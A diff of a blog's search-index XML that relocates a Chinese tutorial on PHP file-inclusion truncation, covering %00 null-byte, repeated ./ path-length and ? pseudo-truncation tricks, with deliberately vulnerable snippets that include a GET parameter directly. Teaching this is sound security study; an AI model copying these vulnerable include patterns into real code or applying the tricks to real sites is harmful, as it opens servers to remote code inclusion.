-<span class="token keyword">echo</span> <span class="token variable">$str</span><span class="token punctuation">;</span>
-<span class="token keyword">include</span> <span class="token variable">$str</span><span class="token punctuation">.</span><span class="token string">'.php'</span><span class="token punctuation">;</span>
-<span class="token delimiter">?></span>
-</code></pre>
-<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210505105544640.png" alt="image-20210505105544640"></p>
-<blockquote>
-<p>linux下需要2038个<code>./</code>组合才能截断。</p>
-</blockquote>
-<h2 id="利用-伪截断"><a href="#利用-伪截断" class="headerlink" title="利用?伪截断"></a>利用<code>?</code>伪截断</h2><p>远程包含时利用问号<code>?</code>来截断，不受GPC和PHP版本的影响，只要能够返回代码给包含函数，它就能执行。</p>
-<p>在HTTP协议中，访问<code>http://remotehost/1.txt</code>和访问<code>httpL://remotehost/1.txt?.php</code>的返回结果是一样的，因为这时候WebServer把<code>?</code>之后的内容当作是请求参数，而<code>txt</code>不在WebServer里面解析，参数对访问<code>1.txt</code>返回的内容不影响，于是就实现了伪截断。</p>
-<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
-<span class="token keyword">echo</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token string">'.php'</span><span class="token punctuation">;</span>
-<span class="token keyword">include</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token string">'.php'</span><span class="token punctuation">;</span>
-<span class="token delimiter">?></span>
-</code></pre>
-<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210505110633801.png" alt="image-20210505110633801"></p>
-]]></content>
-      <tags>
-        <tag>文件包含</tag>
-        <tag>Web</tag>
       </tags>
   </entry>
   <entry>
@@ -1678,6 +1618,66 @@ s<span class="token punctuation">.</span>recv<span class="token punctuation">(</
       <tags>
         <tag>复现</tag>
         <tag>缓冲区溢出</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>文件包含漏洞-文件包含截断</title>
+    <url>/2021/05/05/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%88%AA%E6%96%AD/</url>
+    <content><![CDATA[<h1 id="文件包含截断"><a href="#文件包含截断" class="headerlink" title="文件包含截断"></a>文件包含截断</h1><h2 id="利用-00截断"><a href="#利用-00截断" class="headerlink" title="利用%00截断"></a>利用<code>%00</code>截断</h2><p><code>%00</code>截断受限于<code>GPC</code>和<code>addslashes()</code>等函数。也就是说<strong>在开启GPC或者使用过滤函数过滤的情况下不能使用</strong>，在<strong>PHP 5.3</strong>之后的版本全面修复了文件名<code>%00</code>截断的问题。</p>
+<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+<span class="token keyword">include</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token string">'.php'</span><span class="token punctuation">;</span>
+<span class="token delimiter">?></span>
+</code></pre>
+<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210505100907925.png" alt="image-20210505100907925"></p>
+<blockquote>
+<p>当url参数被过滤时</p>
+<p><code>%00</code>被转义成了0<code>    </code>0两个单体字符，不再具有截断功能</p>
+</blockquote>
+<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210505101258523.png" alt="image-20210505101258523"></p>
+<h2 id="利用-截断"><a href="#利用-截断" class="headerlink" title="利用./截断"></a>利用<code>./</code>截断</h2><p>利用多个<code>./</code>来截断，这种方式不受限于<code>GPC</code>，但是同样在PHP 5.3版本之后被修复。</p>
+<blockquote>
+<p>在windows下使用240个点(<code>.</code>)连接可以截断</p>
+</blockquote>
+<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+<span class="token variable">$str</span> <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">;</span>
+<span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;=</span> <span class="token number">240</span><span class="token punctuation">,</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
+    <span class="token variable">$str</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token string">'.'</span><span class="token punctuation">;</span>
+<span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>
+<span class="token variable">$str</span> <span class="token operator">=</span> <span class="token string">'2.txt'</span><span class="token punctuation">.</span><span class="token variable">$str</span><span class="token punctuation">;</span>
+<span class="token keyword">echo</span> <span class="token variable">$str</span><span class="token punctuation">;</span>
+<span class="token keyword">include</span> <span class="token variable">$str</span><span class="token punctuation">.</span><span class="token string">'.php'</span><span class="token punctuation">;</span>
+<span class="token delimiter">?></span>
+</code></pre>
+<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210505104813141.png" alt="image-20210505104813141"></p>
+<blockquote>
+<p>在windows下，<code>./</code>共240个能够截断。</p>
+</blockquote>
+<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+<span class="token variable">$str</span> <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">;</span>
+<span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;=</span> <span class="token number">118</span><span class="token punctuation">,</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
+    <span class="token variable">$str</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token string">'./'</span><span class="token punctuation">;</span>
+<span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>
+<span class="token variable">$str</span> <span class="token operator">=</span> <span class="token string">'2.txt'</span><span class="token punctuation">.</span><span class="token variable">$str</span><span class="token punctuation">;</span>
+<span class="token keyword">echo</span> <span class="token variable">$str</span><span class="token punctuation">;</span>
+<span class="token keyword">include</span> <span class="token variable">$str</span><span class="token punctuation">.</span><span class="token string">'.php'</span><span class="token punctuation">;</span>
+<span class="token delimiter">?></span>
+</code></pre>
+<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210505105544640.png" alt="image-20210505105544640"></p>
+<blockquote>
+<p>linux下需要2038个<code>./</code>组合才能截断。</p>
+</blockquote>
+<h2 id="利用-伪截断"><a href="#利用-伪截断" class="headerlink" title="利用?伪截断"></a>利用<code>?</code>伪截断</h2><p>远程包含时利用问号<code>?</code>来截断，不受GPC和PHP版本的影响，只要能够返回代码给包含函数，它就能执行。</p>
+<p>在HTTP协议中，访问<code>http://remotehost/1.txt</code>和访问<code>httpL://remotehost/1.txt?.php</code>的返回结果是一样的，因为这时候WebServer把<code>?</code>之后的内容当作是请求参数，而<code>txt</code>不在WebServer里面解析，参数对访问<code>1.txt</code>返回的内容不影响，于是就实现了伪截断。</p>
+<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+<span class="token keyword">echo</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token string">'.php'</span><span class="token punctuation">;</span>
+<span class="token keyword">include</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token string">'.php'</span><span class="token punctuation">;</span>
+<span class="token delimiter">?></span>
+</code></pre>
+<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210505110633801.png" alt="image-20210505110633801"></p>
+]]></content>
+      <tags>
+        <tag>文件包含</tag>
+        <tag>Web</tag>
       </tags>
   </entry>
 </search>
